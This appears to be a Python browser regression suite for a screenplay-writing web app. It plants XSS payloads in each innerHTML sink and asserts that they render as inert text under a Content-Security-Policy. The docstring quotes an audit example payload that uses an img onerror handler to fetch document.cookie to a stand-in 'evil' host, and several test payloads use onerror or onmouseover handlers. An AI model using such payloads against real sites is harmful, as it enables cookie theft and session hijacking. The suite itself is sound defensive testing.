"""Regression suite: model- and script-controlled text must render INERT.

Origin of this suite (2026-09-21 production-readiness audit, finding FE-C1):
`renderProblemBoard()` built its rows by string concatenation into
`innerHTML`, interpolating `f.category` and `f.description || f.issue` raw.
Finding text is model output derived from the writer's own script, and the
server does not escape it (`_sanitize_report` only *filters* feedback), so a
screenplay containing a dialogue line like

    <img src=x onerror="fetch('http://evil/'+document.cookie)">

reached `innerHTML` and executed in the app origin on project open. Because
`studio_token` was a JS-readable (non-HttpOnly) cookie, that XSS could read the
capability token and then drive every mutating API route — a full-script
exfiltration chain from nothing but a hostile .fountain file.

This suite plants payloads at each sink and asserts they render as TEXT. It
fails against the pre-fix code and guards the class going forward: escaping one
sink while leaving its siblings raw is the exact regression it catches.

History: the original canvas was `#problem-board` (FE-C1's sink). P0.2 retired
the board; P0.1 deleted the dormant Feedback View. The payload legs now drive
the Evidence dock (`.dock-lens[data-lens="evidence"]`) — the canonical finding
canvas — and the dead-sink legs assert ABSENCE of the removed renderers, which
is the strongest form of "inert". No security assertion was weakened.

Widened 2026-09 (this pass): the dock is ONE of the app's `innerHTML` sinks,
not the only one. The suite now first takes a CENSUS of app.js straight from
disk — every non-clearing `innerHTML` assignment, grouped by its enclosing
function — and fails if the census drifts (a new sink added outside the swept
set turns the suite red, which is the point). Of the 18 non-clearing
assignments in the current census, 12 render only app-owned literals and 6
interpolate data; each data-bearing sink gets its own planted payload and an
inert-DOM assertion below (no event-handler attribute, no executable node, the
payload visible as literal text). The two pacing-SVG sinks (`renderPacingPanel`)
interpolate parser-computed NUMBERS (`page_start`, `scene_number`, `pace_score`)
which no screenplay can make hostile, so their leg asserts the escapeHtml
CONVENTION against the function's source instead of pretending a payload is
reachable — plus that a live render is inert.

It boots with the capability token ON, like every other suite now that the
harness boots the product as shipped, so the "injected JS cannot read the
token" leg is a real assertion, not a vacuous one.

Run:  python tests/e2e_browser_xss_inert.py
"""
import json
import os
import re
import sys
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from e2e_browser_common import Checks, assert_no_js_errors, launch  # noqa: E402

# Each payload sets a DISTINCT global so one run tells us which sink leaked.
# `onerror` on a broken <img> is the realistic vector: no user interaction, and
# it fires the moment the browser parses the injected markup.
PAYLOAD_TEXT = (
    '<img src=x onerror="window.__XSS_BOARD=1;window.__XSS_COOKIE=document.cookie;">'
)
PAYLOAD_ATTR = '1" onmouseover="window.__XSS_ATTR=1'
PAYLOAD_FV = '<img src=x onerror="window.__XSS_FV=1">'

# ---- sink-sweep payloads (one distinct marker global per swept sink) --------
# Each carries BOTH shapes: a tag-context break (<img onerror>) and a
# quoted-attribute break (`" on...=`), so one sink dropping escapeHtml in
# either context is caught by the structural scan even if it escapes the other.
PAY_CONN = '<img src=x onerror="window.__XSS_CONN=1">x" onmouseenter="window.__XSS_CONN=2'
PAY_DASH_ATTR = 'complete" onclick="window.__XSS_DASH=1'
PAY_DASH_TAG = '<img src=x onerror="window.__XSS_DASH=2">'
PAY_MSG = '<img src=x onerror="window.__XSS_MSG=1">'
PAY_FVCHAT = '<img src=x onerror="window.__XSS_FVCHAT=1">x" onmouseover="window.__XSS_FVCHAT=2'

# ---- innerHTML census: what the sweep below must keep covering ---------------
APP_JS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                      "screenplay_studio", "webapp", "app.js")
# Non-clearing `innerHTML` assignments grouped by enclosing function.
# 18 sinks: the 12 'static' ones interpolate ONLY app-owned literals (a sink
# whose right-hand side is a constant cannot be poisoned through data), the
# 6 'data' ones render server/model/parser text and each has a planted-payload
# leg in `sink_sweep()` below. A new non-clearing sink anywhere fails the
# census check — that failure is the suite demanding its sweep be widened.
EXPECTED_CENSUS = {
    "setConnectionMode":  2,   # static literals only
    "renderConnCard":     1,   # DATA: config server_url + model id  -> swept
    "renderDashboard":    1,   # DATA: manifest stage strings        -> swept
    "setDrawerIdentity":  2,   # static literals only
    "renderMessages":     2,   # static literal (empty-chat hint)
    "renderMessage":      1,   # DATA: assistant reply text          -> swept
    "renderExploreChips": 1,   # static EXPLORE_CHIPS constant
    "renderFixQueuePanel": 1,  # static dawn-meter skeleton
    "renderPacingPanel":  2,   # DATA (parser-computed numbers)      -> convention leg
    "renderFvChat":       2,   # DATA: feedback-view chat text       -> swept
    "attachMic":          3,   # static icon-SVG constants
}


def _sink_census():
    """Count innerHTML lines in app.js: total / comment / clearing / by-function.

    A 'clearing' assignment is `el.innerHTML = ""` — it writes no markup, so it
    cannot carry a payload. Comments describe sinks; they are not sinks.
    """
    with open(APP_JS, encoding="utf-8") as f:
        lines = f.read().splitlines()
    fn_re = re.compile(r"function\s+(\w+)\s*\(")
    total = comment = clearing = 0
    by_func = {}
    for i, l in enumerate(lines):
        if "innerHTML" not in l:
            continue
        total += 1
        s = l.strip()
        if s.startswith("//"):
            comment += 1
            continue
        m = re.search(r"innerHTML\s*=\s*(.*)", s)
        if m and re.match(r'^""\s*;', m.group(1)):
            clearing += 1
            continue
        fn = None
        for j in range(i, -1, -1):
            fm = fn_re.match(lines[j])
            if fm:
                fn = fm.group(1)
                break
        by_func[fn or "<module>"] = by_func.get(fn or "<module>", 0) + 1
    return total, comment, clearing, by_func

# Records any CSP block so the policy itself is verified, not assumed.
CSP_SPY = """
window.__CSP_VIOLATIONS = [];
document.addEventListener('securitypolicyviolation', (e) => {
  window.__CSP_VIOLATIONS.push(e.violatedDirective + ' :: ' + e.blockedURI);
});
"""

# Structural "did anything executable survive the escape pass?" probe, installed
# in the page. For a subtree it counts: (a) any on* EVENT-HANDLER ATTRIBUTE,
# (b) any executable NODE (img/script/iframe/object/embed/srcdoc/javascript:).
# The CSP already refuses execution — this probe is what detects the escaping
# REGRESSION itself, which is what the AGENTS.md convention promises.
INERT_PROBE = """
window.__inertScan = (sel) => {
  const root = document.querySelector(sel);
  const out = { present: !!root, handlers: 0, exec: 0, detail: [], html: '', text: '' };
  if (!root) return out;
  root.querySelectorAll('*').forEach((n) => {
    for (const a of n.attributes) {
      if (/^on[a-z]+$/i.test(a.name)) {
        out.handlers++; out.detail.push(n.tagName + '[' + a.name + ']');
      }
      if (a.name === 'srcdoc'
          || (a.name === 'href' && /^\\s*javascript:/i.test(a.value))) {
        out.exec++; out.detail.push(n.tagName + '[' + a.name + '=' + a.value.slice(0, 24) + ']');
      }
    }
    const tag = n.tagName.toUpperCase();
    if (tag === 'IMG' || tag === 'SCRIPT' || tag === 'IFRAME'
        || tag === 'OBJECT' || tag === 'EMBED') {
      out.exec++; out.detail.push('<' + tag + '>');
    }
  });
  out.html = root.innerHTML;
  out.text = root.textContent;
  return out;
};
"""


def scan(page, selector):
    return page.evaluate("(sel) => window.__inertScan(sel)", selector)


def sink_sweep(page, checks):
    """Plant a hostile payload in the DATA of every dynamic innerHTML sink in
    the census and assert the DOM that comes out is inert: no event-handler
    attribute, no executable node, payload visible as literal text.

    Static-literal sinks from the census are not planted into — their right-hand
    side is an app-owned constant, there is no data channel to poison. The
    census check in run() is what forces a NEW data sink to come here.
    """
    page.evaluate(INERT_PROBE)

    # --- probe self-test: the scanner must be able to see a real leak --------
    # Without this leg every `handlers == 0` below could pass because the scan
    # is blind, not because the app escaped. Feed the scanner one deliberately
    # UNescaped subtree and require it to scream.
    page.evaluate("""() => {
        const h = document.createElement('div');
        h.id = 'xss-probe-selftest';
        h.innerHTML = '<img src=x onerror="1">'
          + '<span title="a\\" onmouseover=\\"x\\">t</span>';
        document.body.appendChild(h);
    }""")
    st = scan(page, "#xss-probe-selftest")
    checks.ok("the inert-probe detects a deliberately unescaped subtree",
              st["handlers"] >= 1 and st["exec"] >= 1,
              f"handlers={st['handlers']} exec={st['exec']} detail={st['detail'][:4]}")
    page.evaluate("() => document.getElementById('xss-probe-selftest').remove()")

    # --- renderConnCard (app.js:714 — config server_url + model id) ----------
    conn = page.evaluate("""(payload) => {
        const c = document.getElementById('conn-card');
        if (!c) return { missing: true };
        const cfg0 = state.config, conn0 = state.connState;
        state.config = Object.assign({}, cfg0, { demo_model: false, server_url: payload });
        state.connState = { ok: true, models: [payload] };
        let err = null;
        try { renderConnCard(); } catch (e) { err = String(e); }
        state.config = cfg0; state.connState = conn0;
        return { err, ran: (c.innerHTML || '').indexOf('conn-card-row') !== -1 };
    }""", PAY_CONN)
    sc = scan(page, "#conn-card")
    checks.ok("conn-card sink ran with the planted payload (leg not vacuous)",
              conn.get("ran") is True and conn.get("err") is None,
              f"{conn}")
    checks.ok("conn-card sink renders server/model config inert",
              sc["handlers"] == 0 and sc["exec"] == 0
              and PAY_CONN in sc["text"],
              f"handlers={sc['handlers']} exec={sc['exec']} detail={sc['detail'][:4]}")
    page.evaluate("() => renderConnCard()")  # repaint with the real config

    # --- renderDashboard / _stageStep (app.js:769 — manifest stage strings) --
    dash = page.evaluate("""(payloads) => {
        const src = (state.projects && state.projects.length)
          ? JSON.parse(JSON.stringify(state.projects[0])) : {};
        src.project = "__xss_probe__";
        src.title = "xss probe";
        src.stages = Object.assign({}, src.stages,
          { parse: payloads[0], analyze: payloads[1] });
        state.projects = (state.projects || []).concat([src]);
        let err = null;
        try { renderDashboard(); } catch (e) { err = String(e); }
        return { err };
    }""", [PAY_DASH_ATTR, PAY_DASH_TAG])
    sc = scan(page, "#dash-grid")
    checks.ok("dashboard stepper ran with the planted payload (leg not vacuous)",
              dash.get("err") is None and "xss probe" in sc["text"],
              f"{dash} present={sc['present']}")
    checks.ok("dashboard stepper renders manifest stage strings inert",
              sc["handlers"] == 0 and sc["exec"] == 0
              and 'onclick="window' not in sc["html"]
              and "<img" not in sc["html"],
              f"handlers={sc['handlers']} exec={sc['exec']} detail={sc['detail'][:4]}")
    # remove the probe card and repaint the real shelf
    page.evaluate("""() => {
        state.projects = (state.projects || []).filter((p) => p.project !== '__xss_probe__');
        renderDashboard();
    }""")

    # --- renderMessage assistant bubble (app.js:3017 — model reply text) ----
    msg = page.evaluate("""(payload) => {
        const host = document.createElement('div');
        host.id = 'xss-msg-host';
        document.body.appendChild(host);
        let err = null;
        try {
          host.appendChild(renderMessage({ role: 'assistant', content: payload }, 999));
        } catch (e) { err = String(e); }
        return { err };
    }""", PAY_MSG)
    sc = scan(page, "#xss-msg-host")
    checks.ok("chat bubble ran with the planted payload (leg not vacuous)",
              msg.get("err") is None and sc["present"]
              and "msg-bubble" in sc["html"],
              f"{msg} present={sc['present']}")
    checks.ok("chat bubble renders assistant text inert",
              sc["handlers"] == 0 and sc["exec"] == 0
              and PAY_MSG in sc["text"],
              f"handlers={sc['handlers']} exec={sc['exec']} detail={sc['detail'][:4]}")
    page.evaluate("() => document.getElementById('xss-msg-host').remove()")

    # --- renderFvChat (app.js:7491 — feedback-view chat text) ---------------
    fv = page.evaluate("""(payload) => {
        const host = document.createElement('div');
        host.id = 'fv-xss-container';
        document.body.appendChild(host);
        const real = window.currentBranchData;
        let err = null;
        try {
          window.currentBranchData = () => ({ messages: [
            { role: 'user', content: payload, quote: { text: payload } },
            { role: 'assistant', partner: 'sameer', content: payload },
          ] });
          renderFvChat('fv-xss-container', 'cowrite');
        } catch (e) { err = String(e); }
        window.currentBranchData = real;
        return { err, ran: !!host.querySelector('.fv-msg') };
    }""", PAY_FVCHAT)
    sc = scan(page, "#fv-xss-container")
    checks.ok("fv-chat sink ran with the planted payload (leg not vacuous)",
              fv.get("err") is None and fv.get("ran") is True,
              f"{fv}")
    checks.ok("fv-chat sink renders writer/model chat text inert",
              sc["handlers"] == 0 and sc["exec"] == 0
              and PAY_FVCHAT in sc["text"],
              f"handlers={sc['handlers']} exec={sc['exec']} detail={sc['detail'][:4]}")
    page.evaluate("() => document.getElementById('fv-xss-container').remove()")

    # --- renderPacingPanel SVGs (app.js:4183/:4207) ---------------------------
    # These two sinks interpolate parser-computed NUMBERS (page_start from the
    # segment index, scene_number from the parser's counter, pace_score rounded
    # — see screenplay_parser/structure.py and screenplay_analyzer/pacing.py),
    # so NO hostile string is reachable through a screenplay file. Instead of
    # pretending one is, this leg asserts the CONVENTION: every one of those
    # interpolations rides escapeHtml in the function's own source, plus a live
    # render with real numeric data is inert.
    pace = page.evaluate("""() => {
        const out = { names: {} };
        const src = renderPacingPanel.toString();
        for (const n of ['scene_number', 'pace_score', 'page_start']) {
          const tpls = src.match(new RegExp('\\\\$\\\\{[^}]*' + n + '[^}]*\\\\}', 'g')) || [];
          out.names[n] = { total: tpls.length,
                           escaped: tpls.filter((t) => t.indexOf('escapeHtml(') !== -1).length };
        }
        const host = document.createElement('div');
        host.id = 'xss-pacing-host';
        document.body.appendChild(host);
        const rs0 = state.reportStats, rp0 = state.report;
        state.reportStats = Object.assign({}, rs0, { pacing: {
          segments: [{ dialogue_words: 8, action_words: 4, page_start: 1 }],
          total_pages: 1 } });
        state.report = Object.assign({}, rp0, {
          pacing: [{ scene_number: 1, pace_score: 60, drag: false }] });
        let err = null;
        try { renderPacingPanel(host); } catch (e) { err = String(e); }
        state.reportStats = rs0; state.report = rp0;
        out.err = err;
        out.ran = !!host.querySelector('.pacing-svg');
        return out;
    }""")
    esc_ok = all(
        v["total"] > 0 and v["escaped"] == v["total"]
        for v in pace["names"].values())
    checks.ok("pacing-SVG sinks interpolate ONLY through escapeHtml (convention leg)",
              esc_ok, f"interpolations={pace['names']}")
    sc = scan(page, "#xss-pacing-host")
    checks.ok("pacing-SVG sink ran with parser-shaped numeric data (leg not vacuous)",
              pace.get("err") is None and pace.get("ran") is True,
              f"{pace}")
    checks.ok("pacing-SVG live render is inert",
              sc["handlers"] == 0 and sc["exec"] == 0,
              f"handlers={sc['handlers']} exec={sc['exec']} detail={sc['detail'][:4]}")
    page.evaluate("() => document.getElementById('xss-pacing-host').remove()")

    # --- none of the planted markers executed anywhere -----------------------
    fired = page.evaluate("""() => ({
        conn: window.__XSS_CONN !== undefined,
        dash: window.__XSS_DASH !== undefined,
        msg: window.__XSS_MSG !== undefined,
        fvchat: window.__XSS_FVCHAT !== undefined,
    })""")
    checks.ok("no swept sink executed its planted payload",
              not any(fired.values()), json.dumps(fired))


def finding(issue, scene=1, category="dialogue", severity="high"):
    """One finding as the analyzer would write it to report.findings.json."""
    return {
        "category": category,
        "severity": severity,
        "issue": issue,
        "description": issue,
        "evidence_quote": "",
        "scene_refs": [scene],
        "scene": scene,
        "rule_id": None,
        "check_id": None,
    }


def post(base, path, body=None, headers=None):
    data = json.dumps(body or {}).encode()
    h = {"Content-Type": "application/json"}
    h.update(headers or {})
    req = urllib.request.Request(base + path, data=data, headers=h, method="POST")
    with urllib.request.urlopen(req, timeout=180) as r:
        return json.loads(r.read().decode() or "{}")


def get(base, path):
    with urllib.request.urlopen(base + path, timeout=60) as r:
        return json.loads(r.read().decode() or "{}")


def run(base, projects_dir, headers):
    checks = Checks()

    # ---- 0. the census: what the sweep below must keep covering -------------
    total, comment, clearing, by_func = _sink_census()
    nonclear = total - comment - clearing
    checks.ok("app.js has exactly the expected number of non-clearing innerHTML sinks",
              nonclear == sum(EXPECTED_CENSUS.values()),
              f"{nonclear} non-clearing of {total} innerHTML lines "
              f"({comment} comments, {clearing} clearing) vs expected "
              f"{sum(EXPECTED_CENSUS.values())}")
    checks.ok("every non-clearing sink lives in a censused function",
              by_func == EXPECTED_CENSUS,
              f"got {json.dumps(by_func)}")

    # ---- 1. a real project with a real report ------------------------------
    sample = post(base, "/api/sample", headers=headers)
    name = sample.get("project")
    checks.ok("sample project created", bool(name), f"got {name!r}")
    post(base, f"/api/projects/{name}/analyze", headers=headers)

    report_path = os.path.join(projects_dir, name, "report.findings.json")
    with open(report_path, "r", encoding="utf-8") as f:
        report = json.load(f)
    baseline = len(report.get("findings") or [])
    checks.ok("demo analysis produced findings", baseline > 0, f"{baseline}")

    # ---- 2. plant the payloads where the model would put them --------------
    planted = [
        finding(PAYLOAD_TEXT, scene=1),
        finding(PAYLOAD_FV, scene=2, category="structure"),
        finding("ordinary finding — control", scene=3, severity="low"),
        finding("attribute probe", scene=PAYLOAD_ATTR, severity="medium"),
    ]
    report["findings"] = (report.get("findings") or []) + planted
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)

    # The server must still hand the payload over verbatim: escaping is a
    # RENDER concern. If the server silently stripped it, this suite could pass
    # for the wrong reason. (Compare against the field VALUES — a json.dumps
    # round-trip escapes the payload's own quotes and can never match.)
    served = get(base, f"/api/projects/{name}/report")
    served_findings = served.get("findings") or []
    raw_served = any(
        PAYLOAD_TEXT in (f.get("issue") or "") or PAYLOAD_TEXT in (f.get("description") or "")
        for f in served_findings)
    checks.ok("server serves the payload raw (escaping is a render concern)",
              raw_served)
    checks.ok("sanitizer kept every planted finding",
              len(served_findings) == baseline + len(planted),
              f"{len(served_findings)} served vs {baseline + len(planted)} planted")

    # ---- 3. drive the REAL app path in a browser ---------------------------
    from playwright.sync_api import sync_playwright
    with sync_playwright() as pw:
        browser, page, errors = launch(pw)
        page.add_init_script(CSP_SPY)
        page.goto(base, wait_until="domcontentloaded")
        page.wait_for_timeout(800)
        cookie_before = page.evaluate("() => document.cookie")

        # openProject() is the app's own entry point — it fetches the report and
        # populates the desk. Then open the Evidence dock: since P0.2 it is the
        # canonical finding canvas (the Problem Board this suite originally
        # targeted was retired; the payload legs re-point here).
        page.evaluate("(n) => openProject(n)", name)
        page.wait_for_timeout(2500)
        page.evaluate("() => openDock('evidence')")
        page.wait_for_timeout(1200)

        # --- the exploit itself ---
        fired = page.evaluate(
            "() => ({board: window.__XSS_BOARD===1, fv: window.__XSS_FV===1,"
            " attr: window.__XSS_ATTR===1})")
        checks.ok("dock-rendered finding payload did NOT execute",
                  fired["board"] is False, "arbitrary JS ran from finding text")
        checks.ok("FV payload flag never fired (and the sink is gone)",
                  fired["fv"] is False and page.evaluate(
                      "() => typeof renderFeedbackView === 'undefined'"),
                  "a resurrected dormant sink executed")

        # The scene number is interpolated into the row's ATTRIBUTES. A payload
        # there must not be able to create a handler attribute — the structural
        # form of the check, which holds whatever event name an attacker picks.
        injected_handlers = page.evaluate(
            "() => document.querySelectorAll("
            "'#context-dock [onmouseover], #context-dock [onerror], #context-dock [onclick], "
            "#context-dock [onload], #context-dock [onfocus], #context-dock [onmouseenter]')"
            ".length")
        checks.ok("no event-handler attributes are built from finding data",
                  injected_handlers == 0,
                  f"{injected_handlers} handler attribute(s) found")

        # …and it must not fire even when the row is actually interacted with
        # (a payload in an unused attribute would otherwise pass vacuously).
        page.evaluate(
            "() => document.querySelectorAll("
            "'.dock-lens[data-lens=\"evidence\"] .fix-row').forEach("
            "n => n.dispatchEvent(new MouseEvent('mouseover', {bubbles:true})))")
        page.wait_for_timeout(300)
        checks.ok("attribute-context payload did NOT execute on interaction",
                  page.evaluate("() => window.__XSS_ATTR === 1") is False,
                  "broke out of the scene attribute")

        stolen = page.evaluate("() => window.__XSS_COOKIE || null")
        checks.ok("capability token was NOT readable by injected JS",
                  stolen is None, f"leaked {stolen!r}")

        # --- and the findings must still be USABLE, not just safe ---
        DOCK = '.dock-lens[data-lens="evidence"]'
        rows = page.evaluate(
            "() => document.querySelectorAll("
            "'.dock-lens[data-lens=\"evidence\"] .fix-row').length")
        checks.ok("the ledger still renders every finding",
                  rows == baseline + len(planted),
                  f"{rows} rows vs expected {baseline + len(planted)}")

        issues = page.evaluate(
            "() => Array.from(document.querySelectorAll("
            "'.dock-lens[data-lens=\"evidence\"] .fix-row'))"
            ".map(n => n.textContent)")
        checks.ok("payload is shown as literal TEXT (not swallowed)",
                  any(PAYLOAD_TEXT in t for t in issues),
                  "the finding text vanished instead of being escaped")

        dock_html = page.evaluate(
            "() => { const n = document.querySelector("
            "'.dock-lens[data-lens=\"evidence\"]');"
            " return n ? n.innerHTML : null; }")
        checks.ok("markup in the DOM is escaped, not raw",
                  bool(dock_html) and "&lt;img" in dock_html
                  and "<img" not in dock_html)

        # --- the row interactions must still WORK ---
        page.evaluate(
            "() => { const it = document.querySelector("
            "'.dock-lens[data-lens=\"evidence\"] .fix-row');"
            " if (it) it.dispatchEvent(new MouseEvent('click', {bubbles: true})); }")
        page.wait_for_timeout(500)
        checks.ok("ledger rows remain interactive",
                  page.evaluate(
                      "() => !!document.querySelector("
                      "'.dock-lens[data-lens=\"evidence\"] .fix-row')"))

        # --- the dormant Feedback view is GONE (P0.1), not merely inert ----
        # The clone was deleted — the strongest form of "inert" is "absent".
        # If it ever comes back, the FV payload flag above re-arms.
        checks.ok("the dormant FV sink does not exist at all",
                  page.evaluate(
                      "() => typeof renderFeedbackView === 'undefined'"
                      " && typeof renderFvBoard === 'undefined'"))
        checks.ok("the FV script renderer's DOM target is gone too",
                  page.evaluate(
                      "() => document.getElementById('fv-script') === null"))

        # --- the containment layer ---
        # The app itself must run clean under the policy (captured BEFORE the
        # deliberate breach attempt below, which legitimately adds a violation).
        violations = page.evaluate("() => window.__CSP_VIOLATIONS || []")
        checks.ok("the app itself triggers no CSP violations",
                  len(violations) == 0, "; ".join(violations[:3]))

        # Assert the policy is actually PRESENT (an absent CSP also reports zero
        # violations, so the check above would otherwise pass vacuously)…
        with urllib.request.urlopen(base + "/", timeout=30) as r:
            csp = r.headers.get("Content-Security-Policy", "")
        checks.ok("SPA document carries a Content-Security-Policy", bool(csp), csp)
        checks.ok("policy pins script-src to 'self' with no inline/eval escape",
                  "script-src 'self'" in csp
                  and "unsafe-eval" not in csp
                  and "unsafe-inline" not in csp.split("style-src")[0], csp)

        # …and prove the policy is ENFORCED, not decorative: an inline handler
        # injected straight into the DOM must be refused. This is the backstop
        # that contains any sink the escaping pass might miss.
        page.evaluate("""() => {
            const d = document.createElement('div');
            d.innerHTML = '<img src=x onerror="window.__CSP_BYPASS=1">';
            document.body.appendChild(d);
        }""")
        page.wait_for_timeout(600)
        checks.ok("an injected inline handler is refused by the policy",
                  page.evaluate("() => window.__CSP_BYPASS === 1") is False,
                  "the CSP did not stop an inline handler — containment is broken")

        # --- every other content-bearing innerHTML sink (the widened sweep) ---
        # The dock legs above cover finding text; sink_sweep() plants a payload
        # in the data behind each remaining dynamic sink from the census and
        # asserts the rendered DOM has no event-handler attribute and no
        # executable node. Runs after the 'app triggers no CSP violations'
        # snapshot: the probe self-test LEGALLY earns a violation (its subtree
        # is deliberately unescaped) and must not pollute that earlier claim.
        sink_sweep(page, checks)

        checks.ok("cookie state unchanged (nothing exfiltrated)",
                  page.evaluate("() => document.cookie") == cookie_before)

        assert_no_js_errors(checks, errors)
        browser.close()

    checks.finish()


if __name__ == "__main__":
    from e2e_browser_common import start_studio, studio_headers
    # The harness boots the product as shipped, so this suite's token leg is a
    # real assertion, not a vacuous one.
    with start_studio() as studio:
        run(studio.base_url, studio.projects_dir,
            studio_headers(studio.base_url))
